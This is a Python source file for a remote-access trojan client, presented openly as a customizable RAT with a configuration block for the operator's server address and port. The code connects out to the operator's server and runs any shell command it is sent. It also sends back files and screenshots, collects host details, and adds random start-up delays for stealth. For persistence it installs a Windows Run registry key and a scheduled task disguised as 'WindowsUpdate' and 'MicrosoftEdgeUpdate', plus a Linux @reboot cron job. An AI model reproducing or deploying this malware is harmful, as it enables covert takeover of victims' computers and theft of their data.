#!/usr/bin/env python3
"""
CUSTOMIZABLE RAT CLIENT
Can be modified for specific requirements
"""

import socket
import subprocess
import os
import json
import base64
import sys
import time
import platform
import random

# ================= CONFIGURATION SECTION =================
# Modify these values according to your needs

SERVER_HOST = "192.168.1.100"    # Your RAT server IP
SERVER_PORT = 4444               # Your RAT server port

# Stealth settings
ENABLE_STEALTH = True            # Enable anti-detection features
RANDOM_DELAY = True              # Add random delays between connections
MAX_RECONNECT_ATTEMPTS = 20      # Maximum reconnection attempts
RECONNECT_DELAY = 30             # Seconds between reconnection attempts

# Persistence settings
ENABLE_PERSISTENCE = True        # Install persistence mechanisms
PERSISTENCE_METHODS = ['all']    # Options: 'registry', 'crontab', 'scheduled_task', 'startup', 'all'

# Features
ENABLE_FILE_TRANSFER = True      # Enable file upload/download
ENABLE_SCREENSHOT = True         # Enable screenshot capture
ENABLE_SYSTEM_INFO = True        # Enable system information collection

# Communication settings
ENABLE_ENCRYPTION = False        # Enable communication encryption
ENCRYPTION_KEY = "custom_encryption_key_123"

# ================ END CONFIGURATION SECTION ================

class CustomRATClient:
    def __init__(self, config):
        self.config = config
        self.server_host = config['SERVER_HOST']
        self.server_port = config['SERVER_PORT']
        self.connected = False
        self.reconnect_attempts = 0
        
    def apply_stealth_measures(self):
        """Apply configured stealth measures"""
        if self.config['ENABLE_STEALTH']:
            print("[*] Applying stealth measures...")
            
            # Random delay before starting
            if self.config['RANDOM_DELAY']:
                delay = random.uniform(5.0, 60.0)
                print(f"[*] Random delay: {delay:.2f} seconds")
                time.sleep(delay)
            
            # Other stealth measures can be added here
            # (process hiding, name spoofing, etc.)
    
    def install_custom_persistence(self):
        """Install persistence based on configuration"""
        if not self.config['ENABLE_PERSISTENCE']:
            return
            
        print("[*] Installing persistence...")
        methods = self.config['PERSISTENCE_METHODS']
        script_path = os.path.abspath(sys.argv[0])
        
        system = platform.system().lower()
        
        if system == 'windows':
            self._install_windows_persistence(methods, script_path)
        elif system == 'linux':
            self._install_linux_persistence(methods, script_path)
        elif system == 'darwin':
            self._install_macos_persistence(methods, script_path)
    
    def _install_windows_persistence(self, methods, script_path):
        """Windows persistence installation"""
        installed_methods = []
        
        if 'all' in methods or 'registry' in methods:
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, script_path)
                winreg.CloseKey(reg_key)
                installed_methods.append("Registry")
            except Exception as e:
                print(f"Registry persistence failed: {e}")
        
        if 'all' in methods or 'scheduled_task' in methods:
            try:
                task_name = "MicrosoftEdgeUpdate"
                cmd = f'schtasks /create /tn "{task_name}" /tr "{script_path}" /sc onlogon /f'
                subprocess.run(cmd, shell=True, capture_output=True)
                installed_methods.append("Scheduled Task")
            except Exception as e:
                print(f"Task scheduler failed: {e}")
        
        if installed_methods:
            print(f"[+] Windows persistence installed: {', '.join(installed_methods)}")
    
    def _install_linux_persistence(self, methods, script_path):
        """Linux persistence installation"""
        installed_methods = []
        
        if 'all' in methods or 'crontab' in methods:
            try:
                cron_job = f"@reboot python3 {script_path} > /dev/null 2>&1 &\n"
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                current_cron = result.stdout if result.returncode == 0 else ""
                
                if script_path not in current_cron:
                    new_cron = current_cron + cron_job
                    subprocess.run(['crontab', '-'], input=new_cron, text=True)
                    installed_methods.append("Crontab")
            except Exception as e:
                print(f"Crontab failed: {e}")
        
        if installed_methods:
            print(f"[+] Linux persistence installed: {', '.join(installed_methods)}")
    
    def _install_macos_persistence(self, methods, script_path):
        """macOS persistence installation"""
        print("[*] macOS persistence would be installed here")
        # Implementation for macOS persistence
    
    def reliable_send(self, data):
        """Send data with optional encryption"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            # Apply encryption if enabled
            if self.config['ENABLE_ENCRYPTION']:
                # Simple XOR encryption for demonstration
                key = self.config['ENCRYPTION_KEY'].encode()
                encrypted_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
                data = encrypted_data
            
            json_data = json.dumps(data.decode('utf-8', errors='ignore') if isinstance(data, bytes) else data)
            encoded_data = base64.b64encode(json_data.encode('utf-8'))
            self.socket.send(len(encoded_data).to_bytes(4, 'big') + encoded_data)
            return True
        except Exception as e:
            print(f"Send error: {e}")
            return False

    def reliable_receive(self):
        """Receive data with optional decryption"""
        try:
            raw_len = self.socket.recv(4)
            if not raw_len:
                return None
            data_len = int.from_bytes(raw_len, 'big')
            data = b''
            while len(data) < data_len:
                packet = self.socket.recv(data_len - len(data))
                if not packet:
                    return None
                data += packet
            
            decoded_data = base64.b64decode(data)
            received_data = json.loads(decoded_data)
            
            # Apply decryption if enabled
            if self.config['ENABLE_ENCRYPTION'] and isinstance(received_data, str):
                key = self.config['ENCRYPTION_KEY'].encode()
                decrypted_data = bytes([ord(received_data[i]) ^ key[i % len(key)] for i in range(len(received_data))])
                return decrypted_data.decode('utf-8')
            
            return received_data
        except Exception as e:
            print(f"Receive error: {e}")
            return None

    def connect_to_server(self):
        """Connect to server with custom timeout"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((self.server_host, self.server_port))
            self.connected = True
            print(f"[+] Connected to {self.server_host}:{self.server_port}")
            return True
        except Exception as e:
            print(f"Connection error: {e}")
            return False

    def execute_custom_command(self, command):
        """Execute command with custom features"""
        try:
            # System information command
            if command == 'sysinfo' and self.config['ENABLE_SYSTEM_INFO']:
                info = {
                    'platform': platform.platform(),
                    'system': platform.system(),
                    'processor': platform.processor(),
                    'python_version': platform.python_version(),
                    'current_user': os.getenv('USERNAME') or os.getenv('USER'),
                    'current_dir': os.getcwd(),
                    'hostname': platform.node()
                }
                return json.dumps(info, indent=2)
            
            # Screenshot command
            elif command == 'screenshot' and self.config['ENABLE_SCREENSHOT']:
                try:
                    from PIL import ImageGrab
                    import io
                    screenshot = ImageGrab.grab()
                    img_bytes = io.BytesIO()
                    screenshot.save(img_bytes, format='JPEG', quality=85)
                    img_data = base64.b64encode(img_bytes.getvalue()).decode('utf-8')
                    return f"SCREENSHOT:{img_data}"
                except ImportError:
                    return "Screenshot requires PIL library"
            
            # File operations
            elif command.startswith('download ') and self.config['ENABLE_FILE_TRANSFER']:
                filename = command[9:].strip()
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode('utf-8')
                    return f"FILE:{filename}:{file_data}"
                else:
                    return f"File not found: {filename}"
            
            # Change directory
            elif command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"Changed directory to: {os.getcwd()}"
            
            # Generic command execution
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                return output if output else "Command executed successfully"
                
        except Exception as e:
            return f"Command execution error: {str(e)}"

    def start_client(self):
        """Main client loop with custom logic"""
        # Apply stealth measures
        self.apply_stealth_measures()
        
        # Install persistence
        self.install_custom_persistence()
        
        while self.reconnect_attempts < self.config['MAX_RECONNECT_ATTEMPTS']:
            try:
                if not self.connected:
                    print(f"[*] Connection attempt {self.reconnect_attempts + 1}/{self.config['MAX_RECONNECT_ATTEMPTS']}")
                    if not self.connect_to_server():
                        self.reconnect_attempts += 1
                        time.sleep(self.config['RECONNECT_DELAY'])
                        continue
                
                # Reset reconnect counter on successful connection
                self.reconnect_attempts = 0
                
                while self.connected:
                    # Receive command from server
                    command = self.reliable_receive()
                    if not command:
                        print("[-] Server disconnected")
                        self.connected = False
                        break
                    
                    if command.lower() in ['exit', 'quit']:
                        print("[*] Disconnecting by server request")
                        return
                    
                    # Execute command and send result
                    result = self.execute_custom_command(command)
                    if not self.reliable_send(result):
                        self.connected = False
                        break
                        
            except socket.timeout:
                print("[-] Connection timeout")
                self.connected = False
            except KeyboardInterrupt:
                print("\n[*] Client shutdown requested")
                break
            except Exception as e:
                print(f"Client error: {e}")
                self.connected = False
                self.reconnect_attempts += 1
                time.sleep(self.config['RECONNECT_DELAY'])
        
        if self.reconnect_attempts >= self.config['MAX_RECONNECT_ATTEMPTS']:
            print("[-] Maximum reconnection attempts reached. Exiting.")

def main():
    """Main entry point for custom client"""
    # Build configuration from the settings above
    config = {
        'SERVER_HOST': SERVER_HOST,
        'SERVER_PORT': SERVER_PORT,
        'ENABLE_STEALTH': ENABLE_STEALTH,
        'RANDOM_DELAY': RANDOM_DELAY,
        'MAX_RECONNECT_ATTEMPTS': MAX_RECONNECT_ATTEMPTS,
        'RECONNECT_DELAY': RECONNECT_DELAY,
        'ENABLE_PERSISTENCE': ENABLE_PERSISTENCE,
        'PERSISTENCE_METHODS': PERSISTENCE_METHODS,
        'ENABLE_FILE_TRANSFER': ENABLE_FILE_TRANSFER,
        'ENABLE_SCREENSHOT': ENABLE_SCREENSHOT,
        'ENABLE_SYSTEM_INFO': ENABLE_SYSTEM_INFO,
        'ENABLE_ENCRYPTION': ENABLE_ENCRYPTION,
        'ENCRYPTION_KEY': ENCRYPTION_KEY
    }
    
    print("🐀 Custom RAT Client Starting...")
    print("=" * 50)
    print(f"Target: {SERVER_HOST}:{SERVER_PORT}")
    print(f"Stealth: {ENABLE_STEALTH}")
    print(f"Persistence: {ENABLE_PERSISTENCE}")
    print(f"Encryption: {ENABLE_ENCRYPTION}")
    print("=" * 50)
    
    client = CustomRATClient(config)
    client.start_client()
    
    print("[*] Custom RAT Client stopped")

if __name__ == "__main__":
    main()